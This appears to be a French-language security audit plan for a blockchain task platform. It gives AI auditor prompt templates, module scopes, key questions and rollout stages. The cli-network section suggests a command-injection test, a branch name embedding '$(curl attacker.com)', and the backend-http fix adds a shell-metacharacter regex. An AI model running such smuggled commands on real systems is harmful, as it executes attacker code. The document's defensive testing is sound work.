1. CORRECTNESS : logique incorrecte, état DB/on-chain incohérent, champ oublié dans hash/sérialisation
2. SECURITY : injection (shell, GraphQL, LLM), TOCTOU, auth guards manquants, fuite d'info, replay
3. RESILIENCE : crash mid-flight, retry storm, panne Redis/RPC, idempotence des workers
4. COMPLETENESS : TODOs en production, stubs non remplacés, cas limites non gérés

Pour chaque finding, retourne un objet JSON avec les champs :
module, file, line, severity (critical|high|medium|low|informational),
dimension (correctness|security|resilience|completeness),
category, title, description, attack_scenario, recommendation, confidence.

Retourne un tableau JSON uniquement. Pas de texte avant ou après.
```

#### Pour les modules `cli-*`

```
Tu es un auditeur de sécurité CLI TypeScript expert.
Analyse le code fourni de façon EXHAUSTIVE et INDÉPENDANTE.

Contexte PTF : CLI utilisé sur la machine locale de l'utilisateur.
La clé privée ne quitte jamais la machine — toute fuite est catastrophique.
Le CLI exécute des commandes git et interagit avec un backend réseau.

Cherche des défauts dans ces 4 dimensions :
1. CORRECTNESS : logique incorrecte, calcul de hash incorrect, sérialisation non déterministe
2. SECURITY : injection shell, fuite clé privée (log, mémoire V8), phishing nonce,
   node discovery non validée, git push vers remote arbitraire
3. RESILIENCE : crash mid-submit, tracker.json corrompu, redémarrage perd le nonce
4. COMPLETENESS : dead code utilisable par erreur, cas limites non gérés (liste vide, TTL expiré)

Pour chaque finding, retourne un objet JSON avec les champs :
module, file, line, severity (critical|high|medium|low|informational),
dimension (correctness|security|resilience|completeness),
category, title, description, attack_scenario, recommendation, confidence.

Retourne un tableau JSON uniquement. Pas de texte avant ou après.
```

#### Pour le module `load-behavior`

```
Tu es un expert en tests de charge et comportements émergents distribués.
Analyse le code fourni sous l'angle de la résilience sous stress.

Conçois des scénarios de charge adversariaux pour chacune de ces situations :
1. 100 devs clament la même tâche simultanément
2. 1000 invalidations cache/s sur Redis Stream
3. ReconciliationWorker crash à chaque étape du claim (avant DB, entre DB et on-chain, après on-chain)
4. 100 deadlines expirent en même temps dans BullMQ
5. Redis Sentinel bascule sur un replica en plein milieu d'un claim

Pour chaque scénario, décris : état initial → actions concurrentes → état final attendu → état final réel possible.
Identifie les invariants qui pourraient être violés.
Retourne un tableau JSON avec les champs :
scenario, invariant_violated, state_before, concurrent_actions, state_after_expected, state_after_possible, severity, recommendation.
```

---

## Stratégie d'audit modulaire

### Principes

Un **module d'audit** est une unité autonome : périmètre défini, déclencheur précis, critère de sortie binaire. Les modules sont indépendants — un module bloqué ne retarde pas les autres. Ils se composent en **rounds** selon le contexte (pré-testnet, testnet, mainnet, incident).

**Trois règles invariantes :**
1. Corriger avant d'auditer ce qui en dépend — les contrats sont gelés en premier.
2. Chaque agent audite sans voir les résultats des autres — la convergence confirme.
3. Tout nouveau code non audité déclenche son module avant mise en production.

---

### Catalogue des modules

Chaque module est autonome et peut être lancé seul ou composé avec d'autres.

---

#### MODULE : `contracts-admin`
**Périmètre :** `onlyOwner`, multisig Gnosis Safe, TimelockController  
**Fichiers :** `ProjectRegistry.sol`, `EscrowVault.sol`, `CreditToken.sol`, `ReputationRegistry.sol`  
**Déclencheur :** avant tout déploiement contrat OU modification d'une fonction admin  
**Dépendances :** aucune  
**Critère de sortie :** 0 finding Critical/High + test simulé compromission 2/5 clés Safe

**Corrections requises avant audit :**
```
1. Déployer Gnosis Safe 3-of-5 (testnet : Polygon Amoy)
2. Transférer ownership de tous les contrats vers le Safe
3. Déployer TimelockController OpenZeppelin — délai 24h testnet / 48h mainnet
4. Fonctions via Timelock : addRegistrar, removeRegistrar, pause, unpause,
   setTreasury, addMinter, removeMinter
5. Fonctions sans Timelock (opérationnelles) : addOperator
```

**Agents :** 2 indépendants — access control + economic attack surface

---

#### MODULE : `contracts-metadata`
**Périmètre :** `registerTaskMetadata`, `setTaskArchiveId`, `verifyTaskMetadata`  
**Fichiers :** `ProjectRegistry.sol` (section MetadataRegistry)  
**Déclencheur :** modification des fonctions metadata du contrat  
**Dépendances :** `contracts-admin` complété  
**Critère de sortie :** 0 finding Critical/High

**Questions clés pour les agents :**
- Peut-on enregistrer un hash zéro ?
- Peut-on écraser un hash existant (`MetadataAlreadyRegistered` tient-il) ?
- `setTaskArchiveId` : le check `contentHash != registered` est-il correct ?
- Griefing : un attaquant peut-il bloquer l'archivage en soumettant un faux arweaveId avant le nœud légitime ?

---

#### MODULE : `backend-claim`
**Périmètre :** `TaskService.claim()`, pattern `claim_pending`, rollback compensatoire  
**Fichiers :** `backend/src/services/task.service.ts`  
**Déclencheur :** modification du flow claim OU avant testnet  
**Dépendances :** aucune (indépendant des contrats)  
**Critère de sortie :** 0 finding Critical/High + test 100 claims simultanés

**Questions clés :**
- Le rollback vers `open` est-il atomique si le RPC échoue entre `claim_pending` et `claimed` ?
- Que se passe-t-il si `ReconciliationWorker` détecte un `claim_pending` stale et le rollback simultanément avec une retry du client ?
- Le TTL Redlock 10s couvre-t-il la latence P99 sur Polygon en cas de congestion ?

---

#### MODULE : `backend-cache`
**Périmètre :** `NodeCacheService`, invalidation, Redis Stream `cache-events`  
**Fichiers :** `backend/src/services/node-cache.service.ts`, intégration dans `task.service.ts` et `project.service.ts`  
**Déclencheur :** ajout ou modification du cache — **peut être lancé maintenant**  
**Dépendances :** aucune  
**Critère de sortie :** cohérence garantie sous 100 writes/s + 0 stale read après invalidation

**Questions clés :**
- Un write concurrent peut-il remettre une entrée invalidée en cache (race entre `putTask` et `invalidateTask`) ?
- Le stream consumer `consumeInvalidations` survit-il à une déconnexion Redis sans perte d'événements ?
- TTL 30s sur les statuts : acceptable pour `tasks mine` (données personnelles) sachant qu'on bypass le cache sur `devAddress` ?
- Que se passe-t-il si le seed PostgreSQL au démarrage est interrompu à mi-chemin ?

---

#### MODULE : `backend-metadata`
**Périmètre :** `MetadataService`, `serializeForHash`, `archiveTask`, `verifyTask`  
**Fichiers :** `backend/src/services/metadata.service.ts`, `storage.provider.ts`  
**Déclencheur :** modification du service métadonnées  
**Dépendances :** `contracts-metadata`  
**Critère de sortie :** 0 finding Critical/High + test archivage Arweave testnet

**Questions clés :**
- `sortKeysDeep` : couvre-t-il les tableaux d'objets (verificationSteps, outOfScope) ?
- Si `archiveTask` échoue après le push Arweave mais avant `setTaskArchiveId`, la tâche est archivée sur Arweave mais pas on-chain. Qui recouvre ?
- `extractTaskHashableFields` : un champ oublié permettrait-il une falsification non détectée ?

---

#### MODULE : `backend-http`
**Périmètre :** headers sécurité, rate limiting Redis, complexity scoring GraphQL, nonces Redis  
**Fichiers :** `backend/src/server.ts`, `backend/src/services/auth.service.ts`, `backend/src/services/validation.service.ts`  
**Déclencheur :** avant testnet — **peut être lancé maintenant, indépendamment**  
**Dépendances :** aucune  
**Critère de sortie :** 0 finding High + scan OWASP ZAP sans finding critique

**Corrections requises avant audit :**
```typescript
// 1. Helmet
import helmet from "helmet";
app.use(helmet({ hsts: { maxAge: 31536000 }, contentSecurityPolicy: true }));

// 2. Metacharacters dans assertSafeCommand
const SHELL_METACHAR_RE = /[;&|`$(){}<>\\!]/;
for (const arg of args) {
  if (SHELL_METACHAR_RE.test(arg)) throw new PtfError(...);
}

// 3. Complexity scoring GraphQL
const complexityRule = createComplexityRule({ maximumComplexity: 100, ... });

// 4. Nonces auth → Redis Sentinel TTL 5min
```

**Agent :** 1 agent OWASP-focused

---

#### MODULE : `load-behavior`
**Périmètre :** comportement sous charge — claims simultanés, expirations massives, cache sous pression  
**Déclencheur :** avant mainnet OU après tout changement de concurrence  
**Dépendances :** `backend-claim`, `backend-cache`  
**Critère de sortie :** 100 claims simultanés sans double-claim + 0 stale après 1000 invalidations/s

**Scénarios :**
1. 100 devs clament la même tâche → 1 seul `claimed`, 99 `TASK_ALREADY_CLAIMED`
2. 100 deadlines expirent en même temps → TimerService traite sans saturer Redis
3. Stream `cache-events` : 1000 invalidations/s → L1 cohérent sur tous les workers
4. ReconciliationWorker crash à chaque étape du claim → DB converge vers état correct

---

#### MODULE : `escrow-final`
**Périmètre :** `EscrowVault.sol` complet — withdrawal, soft-lock, punishment, release  
**Déclencheur :** avant mainnet uniquement (contrat le plus critique)  
**Dépendances :** `contracts-admin` + tous les modules backend complétés  
**Critère de sortie :** 0 finding Critical/High après 5 agents indépendants + Slither + Mythril + Foundry 100k runs

**Note :** Si budget disponible (30–80k€), remplacer par audit Trail of Bits / OpenZeppelin sur ce seul module.

---

#### MODULE : `backend-chain-adapter`
**Périmètre :** couche BAL — circuit breaker, fallback RPC, toutes les méthodes on-chain  
**Fichiers :** `evm.adapter.base.ts`, `polygon.adapter.ts`, `ethereum.adapter.ts`, `chain.registry.ts`, `chain.adapter.ts`  
**Déclencheur :** modification d'un adapter OU avant testnet  
**Dépendances :** aucune  
**Critère de sortie :** 0 finding Critical/High

**Questions clés :**
- Circuit breaker : si le primaire est OPEN et le fallback aussi échoue, l'erreur est-elle correctement propagée sans état DB incohérent ?
- `rpc<T>(primary, fallback?)` : si `primary` réussit mais que son résultat est invalide (tx hash vide, zéro hash), est-ce détecté ?
- `SIGNER_PRIVATE_KEY` : présent dans `process.env` — est-il loggé quelque part accidentellement ? Vérifier tous les `console.log`, `console.error`, formatError.
- `chainRegistry.get(chainId)` : que se passe-t-il si un resolver passe un chainId arbitraire fourni par le client ?
- Toutes les méthodes on-chain (`claimTask`, `softLock`, `releaseTaskReward`, `executePunishment`) : les bytes32 sont-ils correctement padés ? Un taskId < 32 bytes peut-il créer une collision ?

---

#### MODULE : `backend-financial`
**Périmètre :** services financiers — release reward, punitions, wallet verification  
**Fichiers :** `escrow.service.ts`, `punishment.service.ts`, `wallet.service.ts`, `reputation.service.ts`  
**Déclencheur :** modification d'un service financier OU avant testnet  
**Dépendances :** `backend-chain-adapter`  
**Critère de sortie :** 0 finding Critical/High

**Questions clés :**
- `escrow.service.ts` — `releaseTaskReward` : l'ownership check (callerAddress == projectOwner) est-il fait avant ou après la lecture DB ? Un TOCTOU est-il possible ?
- `punishment.service.ts` — séquence burn on-chain + DB : si le burn réussit mais l'écriture DB échoue, les fonds sont brûlés sans trace. Compense-t-on ?
- `punishment.service.ts` — `DEFAULT_PUNISHMENTS` : si le créateur n'a pas configuré de punitions, les valeurs par défaut sont-elles appliquées silencieusement ? Est-ce documenté ?
- `wallet.service.ts` — `verifyWallet` : `signedNonce` est optionnel. Que se passe-t-il si absent ? `ownershipProven = false` est-il bloquant ou seulement un avertissement selon le contexte ?
- `wallet.service.ts` — `softLock` : si l'appel on-chain réussit mais que la DB ne le reflète pas, le dev peut clamer une deuxième tâche (son solde DB paraît insuffisant).
- `reputation.service.ts` — `applyDelta` : un delta négatif peut-il mettre le score en dessous de zéro on-chain ? Le contrat gère-t-il ça ?

---

#### MODULE : `backend-resolvers`
**Périmètre :** couche GraphQL — auth guards, ownership checks, input validation  
**Fichiers :** `task.resolver.ts`, `project.resolver.ts`, `wallet.resolver.ts`, `context.ts`  
**Déclencheur :** modification d'un resolver OU avant testnet  
**Dépendances :** aucune  
**Critère de sortie :** 0 finding Critical/High

**Questions clés :**
- Chaque mutation : `assertAuthenticated` est-il appelé systématiquement ? Lister les mutations sans guard.
- `validateSubmission` : le caller est passé comme `callerAddress` mais le service vérifie `project.ownerAddress`. Si le projet n'existe pas, que retourne le service ? Un resolver peut-il valider la soumission de n'importe qui si le projet est archivé ?
- `releaseTaskReward` : double-check ownership dans le resolver ET dans le service. Lequel est autoritaire ? Peut-on contourner l'un des deux ?
- `projects` query : les projets privés sont anonymisés dans `getPublicView` — vérifier que `mine: true` ne révèle pas les données réelles des projets privés d'autres owners.
- `walletStatus` : pas de guard auth — n'importe qui peut interroger n'importe quelle adresse. Est-ce intentionnel ? Confirmer par rapport à la matrice d'accès.
- Inputs non validés : `args.chain` est passé directement à `chainRegistry.get()` dans plusieurs resolvers. Un chainId forgé peut déclencher une erreur non gérée exposée au client.

---

#### MODULE : `backend-workers`
**Périmètre :** workers asynchrones — réconciliation on-chain, expiration tâches  
**Fichiers :** `reconciliation.worker.ts`, `timer.service.ts`, `deposit.worker.ts`  
**Déclencheur :** modification d'un worker OU avant testnet  
**Dépendances :** `backend-chain-adapter`, `backend-financial`  
**Critère de sortie :** 0 finding Critical/High + crash-test à chaque étape

**Questions clés :**
- `reconciliation.worker.ts` — `reconcileStaleClaimPending` : rollback après 5min. Si le serveur a été arrêté 10min, des claims légitimes (on-chain confirmés mais pas encore réconciliés) peuvent-ils être rollbackés ?
- `reconciliation.worker.ts` — `queryFilter` sur des milliers de blocs : timeout ? Rate limit RPC ? Que se passe-t-il si le RPC retourne une erreur partielle sur un batch de 2000 blocs ?
- `timer.service.ts` — BullMQ repeatable job `deadline-alerts` : si deux instances démarrent en même temps, le job est-il créé deux fois (collision jobId) ou une seule fois ?
- `timer.service.ts` — `concurrency: 10` sur le worker : 10 expirations simultanées peuvent déclencher 10 `softUnlock` en parallèle pour le même dev. Le contrat est-il idempotent sur `softUnlock` ?
- `deposit.worker.ts` — stub : documenté comme non-fonctionnel. À quel moment sera-t-il activé ? Quel est le risque si des dépôts arrivent avant son activation ?

---

#### MODULE : `cli-keystore`
**Périmètre :** sécurité clé privée locale — génération, chiffrement, signature  
**Fichiers :** `cli/src/utils/keystore.ts`, `cli/src/commands/auth.ts`, `cli/src/commands/wallet.ts`  
**Déclencheur :** modification de la gestion du keystore OU avant release CLI  
**Dépendances :** aucune  
**Critère de sortie :** 0 finding Critical/High

**Questions clés :**
- `unlockWallet` : la clé privée retournée en mémoire — combien de temps vit-elle avant d'être effacée ? `privateKey = ""` efface la variable locale mais pas forcément la mémoire V8 (GC non déterministe).
- `createWallet` / `restoreWallet` : mode 0600 sur le fichier keystore. Si le répertoire `~/.ptf/keystore/` a des permissions trop larges, le mode fichier seul ne protège pas.
- `signChallenge` : `wallet.signMessageSync(nonce)` — le nonce est une string arbitraire fournie par le serveur. Un nonce de la forme d'une transaction EIP-712 peut-il tromper l'utilisateur (phishing) ?
- `listLocalWallets` : retourne toutes les adresses en clair dans la réponse CLI. Loggué quelque part ?
- `addressFromPublicKey` : fonction jamais appelée — dead code ou prévu ? Si utilisée, vérifier que `keccak256(pubkey)[12:]` est correct (Ethereum standard).
- `wallet delete` sans confirmation seed phrase : l'utilisateur peut supprimer son keystore sans prouver qu'il a la seed phrase. Perte irréversible si pas de backup.

---

#### MODULE : `cli-network`
**Périmètre :** communication réseau CLI — appels API, vérification hash, injection shell  
**Fichiers :** `cli/src/utils/api.ts`, `cli/src/utils/shell.ts`, `cli/src/commands/submit.ts`, `cli/src/commands/commit.ts`, `cli/src/utils/tracker.ts`, `cli/src/utils/config.ts`  
**Déclencheur :** modification des utilitaires réseau ou shell OU avant release CLI  
**Dépendances :** aucune  
**Critère de sortie :** 0 finding Critical/High

**Questions clés :**
- `shellEscape` : couvre-t-il les noms de branches contenant des caractères spéciaux (`refs/heads/feat/$(cmd)`) ? Tester avec `ptf submit --branch "feat/$(curl attacker.com)"`.
- `gitCmd(repoPath, args)` : `repoPath` vient du `tracker.json` local. Si un attaquant modifie ce fichier, peut-il injecter un chemin malveillant ?
- `api.ts` — `resolveApiUrl()` : pas encore implémenté (hardcodé sur `ptfApiUrl`). Quand la node discovery sera ajoutée, vérifier que le nœud retourné est validé (attestation on-chain) avant d'être utilisé.
- `api.ts` — vérification hash métadonnées : actuellement optionnelle. Pour les opérations financières (claim, publish), rendre obligatoire et documenter le comportement si le hash diverge.
- `tracker.ts` — `~/.config/ptf/active-tasks.json` : fichier non chiffré contenant taskId, projectId, repoPath. Sensibilité ? Accessible à d'autres utilisateurs du système ?
- `submit.ts` — `git push -u origin branch` : si `repoUrl` est contrôlé par l'utilisateur (cas 3 ptf-temp), un push vers un remote arbitraire est-il possible ?

---

### Composition des rounds

Les modules se composent selon le contexte. Un round = N modules lancés en parallèle ou en séquence selon leurs dépendances.

```
ROUND IMMÉDIAT — démarrables maintenant (aucune dépendance) :
  backend-cache          ← NodeCacheService jamais audité
  backend-http           ← corrections helmet/nonces/complexity pendantes
  backend-claim          ← claim_pending + rollback jamais audité
  backend-chain-adapter  ← circuit breaker + fallback RPC jamais audité
  backend-resolvers      ← guards GraphQL jamais audités
  cli-keystore           ← chiffrement, seed phrase, signChallenge
  cli-network            ← shellEscape, git push, tracker

ROUND PRÉ-TESTNET — après dépendances directes résolues :
  contracts-admin        ← bloquant testnet (multisig + timelock)
  contracts-metadata     ← après contracts-admin
  backend-metadata       ← après contracts-metadata
  backend-financial      ← après backend-chain-adapter
  backend-workers        ← après backend-financial + backend-chain-adapter

ROUND TESTNET — sous charge réelle :
  load-behavior          ← après backend-claim + backend-cache + backend-workers

ROUND MAINNET — dernier verrou :
  escrow-final           ← après tous les autres
```

**Règle de composition :** deux modules sans dépendance entre eux s'exécutent en parallèle. Un module attend uniquement que ses dépendances directes aient leur critère de sortie — pas que le round entier soit terminé.

---

### Déploiement progressif mainnet

**Déclencheur :** `escrow-final` validé + testnet stable 4 semaines sans incident.

```
Semaine 1  : déploiement contrats mainnet
  — Gnosis Safe 3-of-5 (clone testnet), Timelock 48h
  — Garde-fou : escrow max 1 000 USDC par projet

Mois 1     : 5 projets pilotes, reward pool < 500 USDC
  — Monitoring 24/7, circuit breaker EscrowVault activé

Mois 2     : levée des limites si aucun incident
```

**Items post-mainnet progressifs :**

| Module futur | Horizon | Prérequis |
|---|---|---|
| `cli-verification` — hash on-chain obligatoire | M+1 | Mainnet stable |
| `network-registry` — NodeRegistry + staking | M+3 | Masse critique nœuds |
| `dao-governance` — DAO + slashing | M+18 | Économie viable |

---

### Tableau de bord des modules

| Module | Statut | Peut démarrer | Bloque |
|---|---|---|---|
| `backend-cache` | 🔴 À auditer | **Maintenant** | `load-behavior` |
| `backend-http` | 🔴 À corriger + auditer | **Maintenant** | — |
| `backend-claim` | 🔴 À auditer | **Maintenant** | `load-behavior` |
| `backend-chain-adapter` | 🔴 À auditer | **Maintenant** | `backend-financial`, `backend-workers` |
| `backend-resolvers` | 🔴 À auditer | **Maintenant** | — |
| `cli-keystore` | 🔴 À auditer | **Maintenant** | Release CLI |
| `cli-network` | 🔴 À auditer | **Maintenant** | Release CLI |
| `contracts-admin` | 🔴 À corriger + auditer | Dès que disponible | Testnet |
| `contracts-metadata` | 🔴 À auditer | Après `contracts-admin` | `backend-metadata` |
| `backend-metadata` | 🔴 À auditer | Après `contracts-metadata` | Archivage Arweave |
| `backend-financial` | 🔴 À auditer | Après `backend-chain-adapter` | `backend-workers`, `escrow-final` |
| `backend-workers` | 🔴 À auditer | Après `backend-financial` + `backend-chain-adapter` | `load-behavior` |
| `load-behavior` | 🔴 À planifier | Après `backend-claim` + `backend-cache` + `backend-workers` | Mainnet |
| `escrow-final` | 🔴 À planifier | Après tous les autres | **Mainnet** |

**Critère de sortie universel :** 0 finding Critical/High non corrigé avant de déverrouiller les modules dépendants.

**Couverture complète :** 14 modules couvrent l'intégralité du périmètre — 4 contrats Solidity, 18 services/workers backend, 3 resolvers GraphQL, 10 commandes et utilitaires CLI.
